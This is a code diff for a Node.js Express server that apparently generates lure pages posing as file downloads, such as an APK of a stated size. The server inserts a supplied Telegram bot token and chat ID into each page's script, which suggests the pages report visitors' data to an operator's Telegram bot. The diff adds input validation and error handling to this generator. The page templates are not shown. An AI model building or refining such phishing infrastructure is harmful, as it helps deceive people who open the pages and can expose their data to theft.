@@ -12,18 +12,23 @@ function generateRandomFolderName() {
 }
 
 // Helper: Generate dynamic HTML
-function generateHtml(filename, size, chatId) {
+function generateHtml(filename, size) {
     const templatePath = path.join(__dirname, 'public', 'templates', 'index.template.html');
+    if (!fs.existsSync(templatePath)) {
+        throw new Error('Template file for index.html is missing.');
+    }
     const template = fs.readFileSync(templatePath, 'utf-8');
     return template
         .replace('{{filename}}', filename)
-        .replace('{{size}}', size)
-        .replace('{{chatId}}', chatId);
+        .replace('{{size}}', size);
 }
 
 // Helper: Generate dynamic JS
 function generateJs(botToken, chatId) {
     const templatePath = path.join(__dirname, 'public', 'templates', 'main.template.js');
+    if (!fs.existsSync(templatePath)) {
+        throw new Error('Template file for main.js is missing.');
+    }
     const template = fs.readFileSync(templatePath, 'utf-8');
     return template
         .replace('{{botToken}}', botToken)
@@ -31,81 +36,76 @@ function generateJs(botToken, chatId) {
 }
 
 // Serve static files
-app.use('/static', express.static(path.join(__dirname, 'public', 'templates')));
+app.use('/static', express.static(path.join(__dirname, 'public')));
 
 // Endpoint to generate dynamic content
-app.get('/', (req, res) => {
-    const { filename, size, chatId, botToken } = req.query;
+app.get('/', (req, res, next) => {
+    try {
+        const { filename, size, chatId, botToken } = req.query;
 
-    if (!filename || !size || !chatId || !botToken) {
-        return res.status(400).send('Missing query parameters: filename, size, chatId, or botToken.');
+        // Validate required query parameters
+        if (!filename || !size || !chatId || !botToken) {
+            return res.status(400).json({ 
+                error: "Missing required query parameters: filename, size, chatId, botToken.",
+                example: `/filename=example.apk&size=25MB&chatId=123456&botToken=YOUR_BOT_TOKEN`
+            });
+        }
+
+        // Validate filename format
+        if (!/^[\w\-_. ]+$/.test(filename)) {
+            return res.status(400).json({ error: 'Invalid filename format.' });
+        }
+
+        // Validate size format (e.g., 25MB, 1GB)
+        if (!/^(\d+)(MB|GB|KB)$/i.test(size)) {
+            return res.status(400).json({ error: 'Invalid size format. Use "25MB" or "1GB".' });
+        }
+
+        // Generate random folder
+        const randomFolder = generateRandomFolderName();
+        const outputPath = path.join(__dirname, 'public', randomFolder);
+
+        if (!fs.existsSync(outputPath)) {
+            fs.mkdirSync(outputPath, { recursive: true });
+        }
+
+        // Generate index.html and main.js
+        const htmlContent = generateHtml(filename, size);
+        const jsContent = generateJs(botToken, chatId);
+        fs.writeFileSync(path.join(outputPath, 'index.html'), htmlContent);
+        fs.writeFileSync(path.join(outputPath, 'main.js'), jsContent);
+
+        // Send success response
+        const resultUrl = `/static/${randomFolder}/index.html`;
+        res.status(200).json({
+            message: 'Page generated successfully.',
+            resultUrl: resultUrl,
+            creator: 'YudaMods',
+        });
+    } catch (err) {
+        next(err);
     }
-
-    // Create a random folder for the generated content
-    const randomFolder = generateRandomFolderName();
-    const outputPath = path.join(__dirname, 'public', randomFolder);
-
-    if (!fs.existsSync(outputPath)) {
-        fs.mkdirSync(outputPath, { recursive: true });
-    }
-
-    // Generate index.html
-    const htmlContent = generateHtml(filename, size, chatId);
-    fs.writeFileSync(path.join(outputPath, 'index.html'), htmlContent);
-
-    // Generate main.js
-    const jsContent = generateJs(botToken, chatId);
-    fs.writeFileSync(path.join(outputPath, 'main.js'), jsContent);
-
-    // Send response with the path to the generated folder
-    res.status(200).send({
-        message: 'Generated successfully',
-        resultUrl: `/static/${randomFolder}/index.html`,
-        creator: 'YudaMods',
-    });
 });
 
 // Custom 404 Handler
 app.use((req, res) => {
-    res.status(404).send(`
-        <html>
-        <head>
-            <title>404 - Not Found</title>
-            <style>
-                body { font-family: Arial, sans-serif; text-align: center; background-color: #f8f9fa; padding: 50px; }
-                h1 { color: #343a40; }
-                a { text-decoration: none; color: #007bff; }
-            </style>
-        </head>
-        <body>
-            <h1>404 - Page Not Found</h1>
-            <p>Sorry, the page you are looking for does not exist.</p>
-            <a href="/">Go Back Home</a>
-        </body>
-        </html>
-    `);
+    const errorPage = path.join(__dirname, 'public', 'errors', '404.html');
+    if (fs.existsSync(errorPage)) {
+        res.status(404).sendFile(errorPage);
+    } else {
+        res.status(404).send('404 - Page Not Found');
+    }
 });
 
-// Error handler
+// Custom Error Handler
 app.use((err, req, res, next) => {
-    console.error(err.stack);
-    res.status(500).send(`
-        <html>
-        <head>
-            <title>500 - Internal Server Error</title>
-            <style>
-                body { font-family: Arial, sans-serif; text-align: center; background-color: #f8f9fa; padding: 50px; }
-                h1 { color: #dc3545; }
-                a { text-decoration: none; color: #007bff; }
-            </style>
-        </head>
-        <body>
-            <h1>500 - Internal Server Error</h1>
-            <p>Something went wrong. Please try again later.</p>
-            <a href="/">Go Back Home</a>
-        </body>
-        </html>
-    `);
+    console.error('Server Error:', err.message);
+    const errorPage = path.join(__dirname, 'public', 'errors', '500.html');
+    if (fs.existsSync(errorPage)) {
+        res.status(500).sendFile(errorPage);
+    } else {
+        res.status(500).send('500 - Internal Server Error');
+    }
 });
 
 // Start server
